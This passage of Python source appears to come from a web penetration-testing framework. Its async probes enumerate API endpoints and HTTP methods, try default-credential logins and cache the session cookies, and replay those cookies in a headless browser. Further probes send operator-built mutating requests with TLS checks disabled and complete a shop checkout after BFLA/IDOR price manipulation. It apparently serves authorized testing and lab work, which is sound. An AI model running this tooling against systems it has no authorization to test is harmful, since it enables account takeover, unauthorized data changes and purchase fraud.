    candidate_paths: list[str] = list(ctx.get("discovered_paths") or [])
    discovered_ids: list[str] = list(ctx.get("discovered_ids") or [])

    async for event in run_endpoint_enum(
        target, session_cookies,
        candidate_paths=candidate_paths or None,
        discovered_ids=discovered_ids or None,
    ):
        yield event


async def probe_api_method_enum(
    target: str,
) -> AsyncIterator[StageEvent | ResultEvent]:
    """Standalone probe B — enumerate safe HTTP methods per endpoint (read-only).

    Reads cached auth from SessionOrchestrator.
    Checks FINDING_EVIDENCE_CTX for accessible endpoints from a prior
    endpoint-enum run.  Falls back to a small set of common paths.
    Fires GET/HEAD/OPTIONS only (read_only=True); emits "Untested method" cards
    for mutation verbs declared in Allow headers.
    """
    from apps.investigation_workspace.execution.runtime import FINDING_EVIDENCE_CTX
    from apps.investigation_workspace.probe.api_method_enum import run_method_enum

    parsed = urlparse(target if "://" in target else f"http://{target}")
    base = f"{parsed.scheme}://{parsed.netloc}"

    cached = _get_session_orch().get_target_auth(base)
    session_cookies: dict = (cached.get("session_cookies") or {}) if cached else {}

    ctx = FINDING_EVIDENCE_CTX.get() or {}
    # Priority 1: accessible endpoints from a prior endpoint-enum run
    accessible_raw: list[dict] | list[str] = (
        ctx.get("accessible") or []
    )
    if accessible_raw and isinstance(accessible_raw[0], dict):
        endpoints = [e["path"] for e in accessible_raw]  # type: ignore[index]
    elif accessible_raw:
        endpoints = list(accessible_raw)  # type: ignore[arg-type]
    else:
        # Priority 2: paths captured by a prior browser-recon run
        captured: list[dict] = ctx.get("captured_requests") or []
        if captured:
            from urllib.parse import urlparse as _urlparse
            seen: dict[str, None] = {}
            for _r in captured:
                _path = _urlparse(_r.get("url", "")).path if isinstance(_r, dict) else ""
                if _path and "/api/" in _path:
                    seen[_path] = None
            endpoints = list(seen) or list(_COMMON_FALLBACK_ENDPOINTS)
        else:
            endpoints = list(_COMMON_FALLBACK_ENDPOINTS)

    async for event in run_method_enum(target, endpoints, session_cookies, read_only=True):
        yield event


async def _merge_probe_streams(
    gen_a: AsyncIterator,
    gen_b: AsyncIterator,
) -> AsyncIterator:
    """Yield events from two async generators concurrently."""
    queue: asyncio.Queue = asyncio.Queue()
    pending = 2

    async def _drain(gen: AsyncIterator) -> None:
        nonlocal pending
        async for ev in gen:
            await queue.put(("ev", ev))
        pending -= 1
        if pending == 0:
            await queue.put(("done", None))

    t1 = asyncio.create_task(_drain(gen_a))
    t2 = asyncio.create_task(_drain(gen_b))
    while True:
        kind, item = await queue.get()
        if kind == "done":
            break
        yield item
    await asyncio.gather(t1, t2, return_exceptions=True)


async def probe_api_full_discovery(
    target: str,
) -> AsyncIterator[StageEvent | ResultEvent]:
    """Orchestrated discovery: recon (C) → endpoint enum + method enum (A ∥ B).

    Phase 1 — use cached auth (or attempt default creds) then scrape
    authenticated pages to discover /api/* paths and resource IDs.

    Phase 2 — run endpoint enumeration (probe A) and HTTP method enumeration
    (probe B, read_only=False full matrix) in parallel, seeding them with C's output.
    """
    from apps.investigation_workspace.probe.api_authed_recon import (
        extract_recon_data,
        run_authed_recon,
    )
    from apps.investigation_workspace.probe.api_endpoint_enum import run_endpoint_enum
    from apps.investigation_workspace.probe.api_method_enum import run_method_enum
    from apps.investigation_workspace.probe.auth_recon import (
        attempt_default_creds_login,
        load_default_credentials,
    )

    parsed = urlparse(target if "://" in target else f"http://{target}")
    base = f"{parsed.scheme}://{parsed.netloc}"

    # Use cached auth if available, otherwise attempt default credentials now.
    cached = _get_session_orch().get_target_auth(base)
    if cached:
        session_cookies = cached.get("session_cookies") or {}
        yield StageEvent(
            label="Using cached authentication for full discovery",
            actions=(f"logged in as {cached.get('username', '?')} (cached)",),
            tools=(),
            detected=(f"session cookies: {list(session_cookies.keys())}",),
            confidence="high",
        )
    else:
        creds = tuple(load_default_credentials())
        yield StageEvent(
            label="Authenticating for API discovery",
            actions=(f"trying {min(len(creds), 5)} credential pair(s) against {base}",),
            tools=("httpx async client", "default-credentials wordlist"),
            confidence="medium",
        )
        auth_result = await attempt_default_creds_login(base, creds)
        session_cookies = {}
        if auth_result:
            _get_session_orch().store_target_auth(base, auth_result)
            session_cookies = auth_result.get("session_cookies") or {}
            yield StageEvent(
                label="Authentication succeeded — starting full discovery",
                actions=(f"logged in as {auth_result.get('username', '?')}",),
                tools=(),
                detected=(f"session cookies: {list(session_cookies.keys())}",),
                confidence="high",
            )
        else:
            yield StageEvent(
                label="Authentication failed — discovery will use empty session",
                actions=("proceeding unauthenticated",),
                tools=(),
                confidence="low",
            )

    # ── Phase 1: Authed recon (C) — yield events AND collect evidence ─────────
    yield StageEvent(
        label="Phase 1 — scraping authenticated pages for API paths",
        actions=("running authed-recon probe C",),
        tools=("httpx async client", "BeautifulSoup4"),
        confidence="medium",
    )
    recon_data = await extract_recon_data(target, session_cookies)
    # Also yield events from the authed recon stream for operator visibility
    async for event in run_authed_recon(target, session_cookies):
        yield event

    discovered_paths: list[str] = list(recon_data.get("discovered_paths") or [])
    discovered_ids: list[str] = list(recon_data.get("discovered_ids") or [])

    yield StageEvent(
        label="Phase 2 — running endpoint enum (A) and method enum (B) in parallel",
        actions=(
            f"seeding A with {len(discovered_paths)} recon path(s)",
            "seeding B with discovered endpoints (full method matrix)",
        ),
        tools=("asyncio parallel streams",),
        confidence="medium",
    )

    # ── Phase 2: Run A and B in parallel (method enum with full verb matrix) ──
    gen_a = run_endpoint_enum(
        target,
        session_cookies,
        candidate_paths=discovered_paths or None,
        discovered_ids=discovered_ids or None,
    )
    gen_b = run_method_enum(
        target,
        discovered_paths if discovered_paths else list(_COMMON_FALLBACK_ENDPOINTS),
        session_cookies,
        read_only=False,  # full discovery is an exploitation-phase action
    )

    async for event in _merge_probe_streams(gen_a, gen_b):
        yield event


async def probe_api_browser_recon(
    target: str,
) -> AsyncIterator[StageEvent | ResultEvent]:
    """Standalone browser recon — inject cached cookies into Playwright and capture traffic.

    Reads cached auth from SessionOrchestrator.
    Injects the session cookies into a headless Chromium context, then navigates
    the standard page list plus one level of same-origin links.  Every /api/*
    network request intercepted by the browser is surfaced in the ResultEvent.

    Operator-triggered only (not run during bootstrap).  Expected runtime: 30-60s.
    """
    from apps.investigation_workspace.probe.api_browser_recon import run_browser_recon

    parsed = urlparse(target if "://" in target else f"http://{target}")
    base = f"{parsed.scheme}://{parsed.netloc}"

    cached = _get_session_orch().get_target_auth(base)
    session_cookies: dict = {}
    if cached:
        session_cookies = cached.get("session_cookies") or {}
        yield StageEvent(
            label=f"Using cached auth as {cached.get('username', '?')} — launching browser",
            actions=(f"session cookies: {list(session_cookies.keys())}",),
            tools=(),
            detected=(f"session cookies: {list(session_cookies.keys())}",),
            confidence="high",
        )
    else:
        yield StageEvent(
            label="No cached auth — browser recon will run unauthenticated",
            actions=("run 'Authenticate with default credentials' first for better coverage",),
            tools=(),
            confidence="low",
        )

    async for event in run_browser_recon(target, session_cookies):
        yield event


async def probe_api_method_execute(
    target: str,
) -> AsyncIterator[StageEvent | ResultEvent]:
    """Execute one operator-constructed HTTP mutation against a method-enumerated endpoint.

    Decodes the (method, path) pair from ACTION_ID_CTX (set by the execute route
    to 'suggestion:{action_kind}').  Reads the operator-provided body fields from
    OPERATOR_INPUTS_CTX (_method, _path, _content_type are meta overrides; all
    other keys become the JSON body).  Authenticates, fires exactly one mutation
    request, and captures the full response as structured evidence.

    This is the ONLY probe that issues mutating requests in the method-enum flow.
    Capabilities 1 and 2 (browser recon + body-shape probing) are strictly read-safe.
    """
    from apps.investigation_workspace.execution.runtime import (
        ACTION_ID_CTX,
        OPERATOR_INPUTS_CTX,
    )
    from apps.investigation_workspace.probe.api_method_enum import decode_action_kind
    from apps.investigation_workspace.probe.auth_recon import (
        attempt_default_creds_login,
        load_default_credentials,
    )

    parsed = urlparse(target if "://" in target else f"http://{target}")
    base = f"{parsed.scheme}://{parsed.netloc}"

    # ── Decode endpoint from action_kind stored in ACTION_ID_CTX ─────────
    action_id = ACTION_ID_CTX.get() or ""
    action_kind = action_id.removeprefix("suggestion:")
    method_from_ak, path_from_ak = decode_action_kind(action_kind)

    # ── Read operator inputs ──────────────────────────────────────────────
    raw_inputs: dict = dict(OPERATOR_INPUTS_CTX.get() or {})
    method = raw_inputs.pop("_method", method_from_ak).upper() or method_from_ak
    path = raw_inputs.pop("_path", path_from_ak) or path_from_ak
    content_type = raw_inputs.pop("_content_type", "application/json") or "application/json"

    # Remaining non-empty values become the JSON body.
    body: dict = {k: v for k, v in raw_inputs.items() if v not in ("", None)}
    full_url = base + path

    yield StageEvent(
        label=f"Preparing {method} {path}",
        actions=(
            f"URL: {full_url}",
            f"body fields: {list(body.keys()) or ['(empty body)']}",
            f"Content-Type: {content_type}",
        ),
        tools=("httpx async client",),
        confidence="high",
    )

    # ── Authenticate ──────────────────────────────────────────────────────
    creds = tuple(load_default_credentials())
    auth = await attempt_default_creds_login(base, creds)
    session_cookies: dict = {}
    if auth:
        session_cookies = auth.get("session_cookies") or {}
        yield StageEvent(
            label=f"Authenticated as {auth['username']} — firing {method} mutation",
            actions=(f"login path: {auth.get('login_path', '?')}",),
            tools=("httpx async client",),
            detected=(f"session cookies: {list(session_cookies.keys())}",),
            confidence="high",
        )
    else:
        yield StageEvent(
            label="Authentication failed — sending unauthenticated mutation",
            actions=("proceeding without session cookies",),
            tools=(),
            confidence="low",
        )

    # ── Fire the mutation (one request) ───────────────────────────────────
    import time as _time  # noqa: PLC0415

    t0 = _time.monotonic()
    try:
        async with httpx.AsyncClient(
            timeout=15.0,
            follow_redirects=False,
            verify=False,
            cookies=session_cookies,
        ) as client:
            if body:
                resp = await client.request(
                    method,
                    full_url,
                    json=body,
                    headers={"Content-Type": content_type},
                )
            else:
                resp = await client.request(method, full_url)
    except httpx.RequestError as exc:
        yield ResultEvent(
            label=f"Network error: {exc}",
            kind="note",
            payload={
                "analysis": {
                    "confirmed": False,
                    "severity": "info",
                    "exploitability_notes": f"Connection error during {method} {path}: {exc}",
                    "references": [],
                },
                "observed": {"indicators": [f"network error: {exc}"]},
            },
        )
        return

    elapsed_ms = int((_time.monotonic() - t0) * 1000)
    confirmed = 200 <= resp.status_code < 300
    body_excerpt = (resp.text or "")[:2_000]
    severity = "high" if confirmed else ("medium" if resp.status_code < 500 else "info")

    yield ResultEvent(
        label=f"{method} {path} → HTTP {resp.status_code}",
        kind="detected" if confirmed else "note",
        payload={
            "request": {
                "method": method,
                "url": full_url,
                "headers": {
                    "Content-Type": content_type,
                    "Cookie": "; ".join(f"{k}={v}" for k, v in session_cookies.items()),
                },
                "body": _json.dumps(body) if body else None,
            },
            "response": {
                "status": resp.status_code,
                "headers": dict(resp.headers),
                "body_excerpt": body_excerpt,
            },
            "sent": {
                "payload_string": _json.dumps(body) if body else "(no body sent)",
                "encoding": "JSON" if body else "none",
                "injection_point": "Request body" if body else "HTTP method",
            },
            "observed": {
                "indicators": [
                    f"HTTP {resp.status_code} in {elapsed_ms}ms",
                    f"response size: {len(resp.content)} bytes",
                    f"Content-Type: {resp.headers.get('content-type', 'unknown')}",
                ],
            },
            "analysis": {
                "confirmed": confirmed,
                "severity": severity,
                "exploitability_notes": (
                    f"{method} {path} returned HTTP {resp.status_code} in {elapsed_ms}ms. "
                    + (
                        "Request succeeded — the mutation may have completed. "
                        "Review the response body for confirmation."
                        if confirmed else
                        f"Server rejected the request (HTTP {resp.status_code}). "
                        "Adjust body fields and retry, or try a different endpoint."
                    )
                ),
                "references": [],
            },
        },
    )


async def probe_purchase_flow(
    target: str,
) -> AsyncIterator[StageEvent | ResultEvent]:
    """Complete a purchase after BFLA/IDOR price manipulation.

    Generic multi-pattern probe: tries common add-to-cart and checkout
    endpoint shapes in order; first success wins.  Works with
    PortSwigger-style form apps, REST JSON cart APIs, and any target
    where a shopping cart + checkout flow exists.

    Reads FINDING_EVIDENCE_CTX for captured_requests to detect
    the product ID from a prior browser-recon run.  Falls back to
    OPERATOR_INPUTS_CTX["product_id"] or iterating IDs 1–3.
    """
    import re as _re

    from apps.investigation_workspace.execution.runtime import (
        FINDING_EVIDENCE_CTX,
        OPERATOR_INPUTS_CTX,
    )
    from apps.investigation_workspace.probe.auth_recon import (
        attempt_default_creds_login,
        load_default_credentials,
    )
    from apps.investigation_workspace.probe.purchase_flow import run_purchase_flow

    parsed = urlparse(target if "://" in target else f"http://{target}")
    base = f"{parsed.scheme}://{parsed.netloc}"

    # ── Detect product ID ────────────────────────────────────────────────
    ctx = FINDING_EVIDENCE_CTX.get() or {}
    operator_inputs = dict(OPERATOR_INPUTS_CTX.get() or {})
    product_id_hint: int | None = None

    # Operator explicit override
    raw_pid = operator_inputs.get("product_id") or operator_inputs.get("productId")
    if raw_pid:
        try:
            product_id_hint = int(raw_pid)
        except (ValueError, TypeError):
            pass

    # Extract from browser-recon captured_requests paths
    if product_id_hint is None:
        for _r in (ctx.get("captured_requests") or []):
            _path = _r.get("url", "") if isinstance(_r, dict) else ""
            _nums = _re.findall(r"/(\d+)/", _path)
            if _nums:
                product_id_hint = int(_nums[0])
                break

    yield StageEvent(
        label="Preparing purchase flow",
        actions=(
            f"target: {base}",
            f"product ID: {product_id_hint or 'auto-detect'}",
        ),
        tools=("httpx async client",),
        confidence="medium",
    )

    # ── Authenticate ─────────────────────────────────────────────────────
    creds = tuple(load_default_credentials())
    auth = await attempt_default_creds_login(base, creds)
    session_cookies: dict = {}
    if auth:
        session_cookies = auth.get("session_cookies") or {}
        yield StageEvent(
            label=f"Authenticated as {auth['username']} — starting purchase flow",
            actions=(f"login path: {auth.get('login_path', '?')}",),
            tools=("httpx async client",),
            detected=(f"session cookies: {list(session_cookies.keys())}",),
            confidence="high",
        )
    else:
        yield StageEvent(
            label="Authentication failed — attempting unauthenticated purchase",
            actions=("proceeding without session cookies",),
            tools=(),
            confidence="low",
        )

    async for event in run_purchase_flow(
        base,
        session_cookies,
        product_id_hint,
        captured_requests=ctx.get("captured_requests") or [],
    ):
        yield event
